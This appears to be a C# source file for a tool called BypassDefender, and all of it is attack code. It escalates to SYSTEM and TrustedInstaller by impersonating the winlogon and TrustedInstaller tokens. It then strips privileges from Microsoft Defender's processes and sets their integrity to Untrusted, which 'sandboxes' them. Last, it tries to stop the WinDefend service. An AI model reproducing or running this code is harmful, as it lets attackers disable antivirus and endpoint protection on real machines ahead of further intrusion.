using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using static BypassDefender.Native;

namespace BypassDefender
{
    internal class Program
    {

        public static void get_username()
        {
            StringBuilder Buffer = new StringBuilder(64);
            int nSize = 64;
            GetUserName(Buffer, ref nSize);
            Console.WriteLine(Buffer.ToString());
        }

        static bool SetPrivilege(IntPtr hToken, string privilege, bool enable = true)
        {
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            LUID lpLuid = new LUID();

            if (!Native.LookupPrivilegeValue(string.Empty, privilege, ref lpLuid))
                return false;

            tp.PrivilegeCount = 1;
            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
            tp.Privileges[0].Luid = lpLuid;

            if (enable)
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            else
                tp.Privileges[0].Attributes = SE_PRIVILEGE_DISABLED;

            if (!Native.AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                return false;

            if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
                return false;

            return true;
        }

        static bool SetIntegrity(IntPtr hToken, string integrity)
        {
            TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            tml.Label.Attributes = SE_GROUP_INTEGRITY;
            tml.Label.Sid = IntPtr.Zero;

            ConvertStringSidToSid(integrity, out tml.Label.Sid);

            IntPtr tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
            Marshal.StructureToPtr(tml, tmlPtr, false);

            if (!SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, tmlPtr, (uint)Marshal.SizeOf(tml)))
            {
                return false;
            }

            return true;
        }

        static private bool SandboxDefender(String processName = "MsMpEng", bool fix = false)
        {
            IntPtr hProcess = IntPtr.Zero;

            // get a handle to the Defender process - remember we must be able to enable the SeDebugPrivilege
            try
            {
                // first get the pid
                int pid = Process.GetProcessesByName(processName)[0].Id;
                Console.WriteLine("[+] {0} PID: {1}", processName ,pid);

                // we have to use the Win32 API, using .Net throws an exception as we can't use PROCESS_QUERY_LIMITED_INFORMATION
                Console.WriteLine("[+] Getting a process handle for {0}.", processName);
                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);

                // throw a general exception which will get caught below
                if (hProcess == IntPtr.Zero)
                    throw new Exception();

                Console.WriteLine("[+] Process handle: 0x{0}", hProcess.ToString("X"));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Unable to get a handle to the process, check you have the correct privileges!");
                Console.WriteLine("[!] {0}", ex.Message);
                return false;
            }

            // get a handle to this process' token
            Console.WriteLine("[+] Getting a token handle for the {0} process.", processName);
            if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out IntPtr hTokenHandle))
            {
                Console.WriteLine("[!] Unable to get a handle to the process token, ffs!");
                return false;
            }

            Console.WriteLine("[+] Token handle: 0x{0}", hTokenHandle.ToString("X"));

            if (!fix)
            {
                // break defender
                Console.WriteLine("[+] Will disable {0} privileges.",processName);

                for (int i = 0; i < privs.Length; i++)
                {
                    if (!SetPrivilege(hTokenHandle, privs[i], false))
                    {
                        Console.WriteLine("[!] Unable to disable {0}!", privs[i]);
                    }
                }

                Console.WriteLine("[+] Will set {0} Integrity to Untrusted.", processName);
                if (!SetIntegrity(hTokenHandle, ML_UNTRUSTED))
                {
                    Console.WriteLine("[!] Unable to set integrity to Untrusted!");
                }
            }
            else
            {
                // fix defender
                // TODO - this does not work - ERROR_TOKEN_ALREADY_IN_USE
                Console.WriteLine("[+] Will enable {0} privileges.", processName);

                for (int i = 0; i < privs.Length; i++)
                {
                    if (!SetPrivilege(hTokenHandle, privs[i]))
                    {
                        Console.WriteLine("[!] Unable to disable {0}!", privs[i]);
                    }
                }

                Console.WriteLine("[+] Will set {0} Integrity to System.", processName);
                if (!SetIntegrity(hTokenHandle, ML_SYSTEM))
                {
                    Console.WriteLine("[!] Unable to set integrity to System!");
                }
            }

            return true;
        }

        //old code

        public static void start_trustedinstaller_service()
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenSCManager failed!");
                return;
            }
            Console.WriteLine("OpenSCManager success!");
            string ServiceName = "TrustedInstaller"; 
            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint) SERVICE_ACCESS.SERVICE_START);
            
            bool bResult = StartService(schService, 0, null);
            if (bResult)
            {
                Console.WriteLine("TrustedInstaller service started!");
            }
            else
            {
                Console.WriteLine("TrustedInstaller service cannot be started!");
            }
        
            Thread.Sleep(2000);
            CloseHandle(schService);
            CloseHandle(SCMHandle);

        }
       
        public static bool EnableDebugPrivilege(bool enable = true)
        {
            try
            {
                bool retVal;

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                LUID lpLuid = new LUID();

                IntPtr hproc = GetCurrentProcess();
                IntPtr htok = IntPtr.Zero;
                retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out htok);
                tp.PrivilegeCount = 1;
                tp.Privileges = new LUID_AND_ATTRIBUTES[1];
                tp.Privileges[0].Luid = lpLuid;
                if (enable)
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                else
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_DISABLED;

                retVal = LookupPrivilegeValue(null, "SeDebugPrivilege", ref lpLuid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine("SeDebugPrivilege enabled: " + retVal);
                return true;
            }
            catch (Exception ex)
            {
                throw ex;                
            }

        }

        public static void escalate_to_system()
        {
            //check if SE_DEBUG_Privilege is enabled
            bool res = EnableDebugPrivilege();
            if (!res)
            {
                Console.WriteLine("SeDebugPrivilege failed");
                Environment.Exit(1);
            }

            //impersonate using winlogon.exe SYSTEM token
            Process[] processlist = Process.GetProcesses();
            IntPtr tokenHandle = IntPtr.Zero;
            foreach (Process theProcess in processlist)
            {
                if (theProcess.ProcessName == "winlogon")
                {
                    bool token = OpenProcessToken(theProcess.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
                    if(!token)
                    {
                        Console.WriteLine("OpenProcessToken Failed!");
                        return;
                    }
                    else
                    {
                        token = ImpersonateLoggedOnUser(tokenHandle);
                        Console.Write("User after impersonation: ");
                        get_username();                        
                    }
                    CloseHandle(theProcess.Handle);
                }
            }
            CloseHandle(tokenHandle);
            
        }

        public static void escalate_to_trustedinstaller()
        {
            //impersonate using trustedintaller.exe token
            Process[] processlist = Process.GetProcesses();
            IntPtr tokenHandle = IntPtr.Zero;
            foreach (Process theProcess in processlist)
            {
                if (theProcess.ProcessName == "TrustedInstaller")
                {
                    bool token = OpenProcessToken(theProcess.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
                    if (!token)
                    {
                        Console.WriteLine("OpenProcessToken Failed!");
                        return;
                    }
                    else
                    {
                        token = ImpersonateLoggedOnUser(tokenHandle);
                        Console.Write("Trusted Installer impersonated!");
                        get_username();
                    }
                    CloseHandle(theProcess.Handle);
                }               
            }
            CloseHandle(tokenHandle);

        }

        public static void stop_defender_service()
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenSCManager failed!");
                return;
            }
            Console.WriteLine("OpenSCManager success! {0}", SCMHandle);
            string ServiceName = "WinDefend";//"WinDefend";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF003F);
            if (schService == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine("OpenService failed! {0}", error);
                return;
            }
            Console.WriteLine("OpenService success! {0}", schService);
            SERVICE_STATUS ssp = new SERVICE_STATUS();
            //bool bResult = ControlService(schService, SERVICE_CONTROL.STOP, ref ssp);
            ssp.serviceType = 0x00000010;
            ssp.controlsAccepted = (int) (SERVICE_ACCEPT.STOP | SERVICE_ACCEPT.SHUTDOWN);
            ssp.currentState = (int) SERVICE_STATE.SERVICE_STOPPED;

            bool bResult = SetServiceStatus(schService, ref ssp);

            if (bResult)
            {
                Console.WriteLine("Windefender service stopped!");
            }
            else
            {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine("Windefender service cannot be stopped! {0}", error);
            }

            Thread.Sleep(2000);
            CloseHandle(schService);
            CloseHandle(SCMHandle);
        }

        public static void Main(string[] args)
        {
            Console.Write("Original user:");
            get_username();
            start_trustedinstaller_service();
            escalate_to_system();
            escalate_to_trustedinstaller();

            String[] defenderProcessArray = {
                "MsMpEng",
                "MsSense",
                "MpCmdRun",
                "SenseCE",
                "SenseIR",
                "SenseNdr"
            };

            foreach (string defenderProcessName in defenderProcessArray)
            {
                Console.WriteLine("\nProcessing : {0}",defenderProcessName);
                SandboxDefender(defenderProcessName);
            }

            stop_defender_service();

        }
    }
}
